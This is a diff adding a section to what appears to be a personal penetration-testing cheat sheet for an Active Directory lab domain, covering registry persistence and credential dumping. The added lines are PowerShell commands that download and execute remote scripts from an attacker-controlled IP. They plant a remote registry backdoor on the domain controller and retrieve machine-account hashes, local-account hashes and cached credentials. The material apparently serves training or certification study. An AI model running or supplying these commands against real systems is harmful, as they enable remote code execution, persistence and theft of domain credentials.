@@ -2806,6 +2806,26 @@ Get-WmiObject -class win32_operatingsystem -computername dcorp-dc
 IEX (New-Object System.Net.WebClient).DownloadString("http://172.16.99.209/oscp/Set-RemotePSRemoting.ps1")
 Set-RemotePSRemoting -Username student209 -computername dcorp-dc -Verbose
 ```
+##### POWERSHELL - PERSISTENCE REGISTRO
+```
+IEX (New-Object System.Net.WebClient).DownloadString("http://172.16.99.209/oscp/Add-RemoteRegBackdoor.ps1")
+Add-RemoteRegBackdoor -Computername dcorp-dc -Trustee student209 -Verbose
+```
+```
+IEX (New-Object System.Net.WebClient).DownloadString("http://172.16.99.209/oscp/crtp/RemoteHashRetrieval.ps1")
+Get-RemoteMachineAccountHash -Computername dcorp-dc -Verbose
+Get-RemoteLocalAccountHash -Computername dcorp-dc -Verbose
+Get-RemoteCachedCredential -Computername dcorp-dc -Verbose
+```
+
+
+
+
+
+
+
+
+
 
 
 
